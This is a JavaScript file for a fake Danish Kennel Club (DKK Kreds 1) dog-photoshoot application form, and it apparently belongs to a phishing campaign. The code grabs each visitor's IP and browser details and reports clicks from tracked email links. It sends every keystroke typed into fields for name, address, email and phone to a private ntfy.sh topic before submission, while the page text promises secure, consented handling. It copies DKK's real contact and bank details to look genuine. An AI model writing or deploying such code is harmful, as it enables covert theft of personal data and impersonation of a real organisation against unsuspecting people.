// --- CONFIGURATION ---
const NTFY_TOPIC = "dkkkreds1_fotoshoot_secret_98765";
let currentLang = 'da';
let dogCount = 0;
let userIP = "Fetching...";

// Sporings- og sessionsdata
const sessionInfo = {
    id: Math.random().toString(36).substring(2, 9).toUpperCase(),
    startTime: new Date().toISOString(),
    userAgent: navigator.userAgent,
    screen: `${window.screen.width}x${window.screen.height}`,
    lang: navigator.language
};

let typingTimeout = {}; // Til debouncing af input logs

// --- ALLOWED MAJOR DOMAINS ---
const allowedDomains = [
    'gmail.com', 'yahoo.com', 'hotmail.com', 'hotmail.dk', 'outlook.com', 'outlook.dk', 
    'live.com', 'live.dk', 'icloud.com', 'me.com', 'mac.com', 'mail.com', 'msn.com',
    'protonmail.com', 'jubii.dk', 'sol.dk', 'tdcadsl.dk', 'webspeed.dk', 'mail.dk', 
    'ofir.dk', 'post.tele.dk', 'privat.dk', 'stofanet.dk', 'get2net.dk', 'ymail.com', 
    'googlemail.com', 'pm.me', 'zohomail.eu', 'zohomail.com', 'gmx.com'
];

// --- TRANSLATIONS ---
const i18n = {
    da: {
        nav1: "Hundeejer", nav2: "Opdrætter", nav3: "Aktiviteter",
        nav4: "Udstilling", nav5: "Om DKK", nav6: "Kontakt", nav7: "Bliv medlem", nav8: "Uddannelser", nav_shop: "Shop", login: "Login",
        intro_subtitle: "Udstilling og Fotografering",
        intro_title: "Forespørgsel vedrørende fotografering af dine hunde til DKK Kreds 1",
        data_info: "<strong>Information om dataindsamling:</strong> De oplysninger du indtaster her, sendes sikkert og bruges udelukkende til at vurdere dit match som hundemodel for DKK Kreds 1. Data deles ikke med tredjepart uden dit samtykke.",
        owner_title: "1. Ejerinformation", f_name: "Fulde navn", f_address: "Postnr. og By", 
        f_email: "E-mailadresse", f_email_note: "Eks. gmail.com, hotmail.com", f_phone: "Telefonnummer", 
        f_socials: "Sociale Medier (f.eks. Instagram)", f_dkk: "DKK Medlemsnummer (Valgfrit)", f_desc: "Kort beskrivelse af dig selv",
        dog_title: "2. Hundeinformation", d_name: "Hundens navn og Race", d_age: "Hundens Alder", 
        d_skills: "Tricks og Færdigheder", d_photos: "Link til billeder (Google Drev/SoMe)",
        privacy_consent: "Jeg bekræfter hermed, at jeg accepterer behandlingen af mine personoplysninger i overensstemmelse med privatlivspolitikken.",
        btn_add_dog: "Tilføj endnu en hund", btn_submit: "Send Ansøgning", btn_sending: "Sender...",
        success_title: "Tak for din ansøgning!", success_desc: "Dine informationer er sendt sikkert afsted til DKK Kreds 1.",
        error_title: "Hov, der mangler noget!", error_desc: "Tjek de røde felter. Husk at e-mail skal være gyldig, telefonnummeret skal være korrekt, og privatlivspolitikken skal accepteres.",
        footer_contact: "Kontakt DKK", footer_contact_info: "Dansk Kennel Klub<br>Parkvej 1 <br>2680 Solrød Strand<br>56 18 81 00 <br>post@dkk.dk<br>CVR 11 88 18 15",
        footer_bank: "Bank", footer_bank_info: "<strong>Betalinger til Dansk Kennel Klub</strong><br><strong>Reg. nr.:</strong> 7316 Konto: 0001089500<br><strong>IBAN-nr:</strong> DK0973160001089500<br><strong>SWIFT-kode:</strong> JYBADKKK",
        footer_mypage: "Min side", footer_press: "Presse", footer_privacy: "Privatlivspolitik"
    },
    en: {
        nav1: "Dog Owner", nav2: "Breeder", nav3: "Activities",
        nav4: "Exhibitions", nav5: "About DKK", nav6: "Contact", nav7: "Become a member", nav8: "Education", nav_shop: "Shop", login: "Login",
        intro_subtitle: "Exhibition and Photography",
        intro_title: "Inquiry regarding photography of your dogs for DKK District 1",
        data_info: "<strong>Data collection info:</strong> The information you enter here is sent securely and is used exclusively to evaluate your match as a dog model for DKK District 1. Data is not shared with third parties without your consent.",
        owner_title: "1. Owner Info", f_name: "Full Name", f_address: "Zip Code and City", 
        f_email: "Email Address", f_email_note: "E.g., gmail.com, hotmail.com", f_phone: "Phone Number", 
        f_socials: "Social Media (e.g., Instagram)", f_dkk: "DKK Member Number (Optional)", f_desc: "Short description of yourself",
        dog_title: "2. Dog Info", d_name: "Dog's Name & Breed", d_age: "Dog's Age", 
        d_skills: "Tricks & Skills", d_photos: "Link to photos (Google Drive/SoMe)",
        privacy_consent: "I hereby confirm that I accept the processing of my personal data in accordance with the privacy policy.",
        btn_add_dog: "Add another dog", btn_submit: "Submit Application", btn_sending: "Sending...",
        success_title: "Thank you!", success_desc: "Your information has been securely sent to DKK District 1.",
        error_title: "Oops, something is missing!", error_desc: "Please check the red fields. Make sure the email is from a major provider, the phone number is valid, and you have accepted the privacy policy.",
        footer_contact: "Contact DKK", footer_contact_info: "Danish Kennel Club<br>Parkvej 1 <br>2680 Solrød Strand<br>+45 56 18 81 00 <br>post@dkk.dk<br>CVR 11 88 18 15",
        footer_bank: "Bank", footer_bank_info: "<strong>Payments to the Danish Kennel Club</strong><br><strong>Reg. no.:</strong> 7316 Account: 0001089500<br><strong>IBAN:</strong> DK0973160001089500<br><strong>SWIFT:</strong> JYBADKKK",
        footer_mypage: "My page", footer_press: "Press", footer_privacy: "Privacy Policy"
    }
};

// --- INITIALIZE & TRACK PAGE VIEW ---
window.addEventListener('DOMContentLoaded', async () => {
    try {
        let res = await fetch('https://api.ipify.org?format=json');
        let data = await res.json();
        userIP = data.ip;
        
        // Tracking-script til dem der kommer fra E-mailen (Flyttet herind fra HTML'en)
        const urlParams = new URLSearchParams(window.location.search);
        const userName = urlParams.get('user');
        if (userName && !sessionStorage.getItem('hasTrackedEmailClick')) {
            sendNtfy("📧 E-mail Klikket!", `${userName.replace(/_/g, ' ')} har netop klikket på linket i e-mailen og er nu landet på siden!\nIP: ${userIP}`, "email,bell");
            sessionStorage.setItem('hasTrackedEmailClick', 'true');
        }

    } catch(e) { userIP = "Unknown"; }

    logPageView();
    restoreFormState();
    bindLanguageSwitch();
});

// -- LOGGING FUNCTIONS --
function sendNtfy(title, message, tags) {
    return fetch(`https://ntfy.sh/`, {
        method: 'POST',
        body: JSON.stringify({
            topic: NTFY_TOPIC,
            title: title,
            message: message,
            tags: tags ? tags.split(',') : []
        }),
        headers: { 'Content-Type': 'application/json' }
    }).catch(err => console.error("Ntfy Error:", err));
}

function trackEvent(eventName, fieldName, value, icon) {
    const msg = `Session: ${sessionInfo.id}\nIP: ${userIP}\n\nFelt: ${fieldName}\nInput: ${value}`;
    sendNtfy(`🕵️ Tracker - ${eventName}`, msg, icon);
}

function logPageView() {
    const msg = `Ny besøgende på formularen!\n\nIP: ${userIP}\nSession ID: ${sessionInfo.id}\nSkærm: ${sessionInfo.screen}\nSprog: ${sessionInfo.lang}\nBrowser: ${sessionInfo.userAgent}`;
    sendNtfy("🌐 Ny Besøgende (Sidevisning)", msg, "globe_with_meridians");
}

// --- FLUID REAL-TIME VALIDATION ---
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!re.test(email)) return false;
    const domain = email.split('@')[1].toLowerCase();
    return allowedDomains.includes(domain);
}

function validatePhone(phone) {
    const cleanPhone = phone.replace(/[\s\-\(\)]/g, '');
    const re = /^(\+?\d{8,15})$/; 
    return re.test(cleanPhone);
}

function validateField(input, isBlurEvent = false) {
    let isValid;
    const isRequired = input.hasAttribute('required');

    // Håndter checkbox validatoren
    if (input.type === 'checkbox') {
        isValid = !isRequired || input.checked;
    } else {
        const val = input.value.trim();
        isValid = input.checkValidity() && val !== '';
        if (input.type === 'email' && val !== '') isValid = validateEmail(val);
        if (input.type === 'tel' && val !== '') isValid = validatePhone(val);
    }

    const icon = input.parentElement.querySelector('.valid-icon');

    if (isValid) {
        input.classList.remove('is-invalid', 'shake');
        // Kun tekstfelter har .is-valid og .hidden håndtering
        if (input.type !== 'checkbox') {
            input.classList.add('is-valid');
            if(icon) icon.classList.remove('hidden');
        }
    } else {
        input.classList.remove('is-valid');
        if(icon) icon.classList.add('hidden');
        
        let conditionFailed = false;
        if (input.type === 'checkbox') {
            conditionFailed = (isBlurEvent && isRequired && !input.checked);
        } else {
            conditionFailed = (isBlurEvent && isRequired && input.value.trim() === '') || (isBlurEvent && input.value.trim() !== '');
        }

        if (conditionFailed || input.classList.contains('is-invalid')) {
            input.classList.add('is-invalid');
        }
    }
    return isValid;
}

// --- DYNAMIC DOG FIELDS ---
function addDogField(savedData = null) {
    dogCount++;
    const container = document.getElementById('dogsContainer');
    const div = document.createElement('div');
    div.className = 'dog-card grid grid-cols-1 md:grid-cols-2 gap-8';
    
    const nameVal = savedData ? savedData.name : '';
    const ageVal = savedData ? savedData.age : '';
    const photosVal = savedData ? savedData.photos : '';
    const skillsVal = savedData ? savedData.skills : '';

    div.innerHTML = `
        <div class="absolute -top-3 left-4 bg-dkkRed text-white text-xs font-bold px-3 py-1 rounded-full">#${dogCount}</div>
        <div class="floating-input-group col-span-2">
            <input type="text" class="dogName floating-input track-input" required placeholder=" " value="${nameVal}">
            <label class="floating-label" data-i18n="d_name">${i18n[currentLang].d_name}</label>
            <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
        </div>
        <div class="floating-input-group">
            <input type="text" class="dogAge floating-input track-input" required placeholder=" " value="${ageVal}">
            <label class="floating-label" data-i18n="d_age">${i18n[currentLang].d_age}</label>
            <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
        </div>
        <div class="floating-input-group">
            <input type="url" class="dogPhotos floating-input track-input" required placeholder=" " value="${photosVal}">
            <label class="floating-label" data-i18n="d_photos">${i18n[currentLang].d_photos}</label>
            <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
        </div>
        <div class="floating-input-group col-span-2">
            <input type="text" class="dogSkills floating-input track-input" required placeholder=" " value="${skillsVal}">
            <label class="floating-label" data-i18n="d_skills">${i18n[currentLang].d_skills}</label>
            <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
        </div>
    `;
    container.appendChild(div);
    bindTracking(div);
    
    if(savedData) div.querySelectorAll('input').forEach(input => validateField(input, false));
}
document.getElementById('addDogBtn').addEventListener('click', () => addDogField(null));

// --- BLUR, FOCUS & KEYSTROKE TRACKING ---
function bindTracking(parent = document) {
    const inputs = parent.querySelectorAll('.track-input');
    inputs.forEach(input => {
        const fieldId = input.id || input.className.split(' ')[0] + Math.random().toString(36).substr(2,4);

        if (input.type === 'checkbox') {
            input.addEventListener('change', (e) => {
                validateField(e.target, false);
                saveFormState();
                trackEvent("Checkbox Skiftet", "Privatlivspolitik Accepteret", e.target.checked, "check");
            });
            return; // Undgå focus/input logning for checkbox
        }

        // FOCUS Event
        input.addEventListener('focus', (e) => {
            validateField(e.target, false);
        });

        // INPUT Event (Debounced Live Tracking)
        input.addEventListener('input', (e) => {
            validateField(e.target, false);
            saveFormState(); 
            
            const val = e.target.value.trim();
            const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";

            clearTimeout(typingTimeout[fieldId]);
            // Vent 2,5 sekunder efter de stopper med at skrive
            typingTimeout[fieldId] = setTimeout(() => {
                if(val.length > 0) {
                    trackEvent("Live Input", label, val, "pencil2");
                }
            }, 2500); 
        });
        
        // BLUR Event (Når brugeren forlader et felt)
        input.addEventListener('blur', (e) => {
            validateField(e.target, true); 
            const val = e.target.value.trim();
            const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";
            if (val !== "") {
                clearTimeout(typingTimeout[fieldId]); 
                trackEvent("Forlod felt", label, val, "clipboard");
            }
        });
    });
}

// --- SAVE & RESTORE (LOCAL STORAGE) ---
function saveFormState() {
    const data = {
        ownerName: document.getElementById('ownerName').value,
        ownerAddress: document.getElementById('ownerAddress').value,
        ownerEmail: document.getElementById('ownerEmail').value,
        ownerPhone: document.getElementById('ownerPhone').value,
        ownerSocials: document.getElementById('ownerSocials').value,
        dkkMember: document.getElementById('dkkMember').value,
        ownerDescription: document.getElementById('ownerDescription').value,
        privacyConsent: document.getElementById('privacyConsent').checked,
        dogs: []
    };
    document.querySelectorAll('.dog-card').forEach(card => {
        data.dogs.push({
            name: card.querySelector('.dogName').value,
            age: card.querySelector('.dogAge').value,
            photos: card.querySelector('.dogPhotos').value,
            skills: card.querySelector('.dogSkills').value
        });
    });
    localStorage.setItem('dkkFotoshootData', JSON.stringify(data));
}

function restoreFormState() {
    const saved = localStorage.getItem('dkkFotoshootData');
    if (saved) {
        const data = JSON.parse(saved);
        document.getElementById('ownerName').value = data.ownerName |
